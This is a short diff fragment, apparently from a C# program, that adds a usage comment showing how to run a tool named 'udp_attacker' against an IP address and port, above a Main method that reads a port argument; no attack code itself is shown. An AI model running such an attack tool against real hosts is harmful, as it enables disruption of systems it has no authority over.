@@ -1,3 +1,5 @@
+//use udp_attacker like so /tmp/udp_attacker.exe 192.168.1.3 4444
+
 static void Main(string[] args) {
   int lport = int.Parse(args[1]);
 
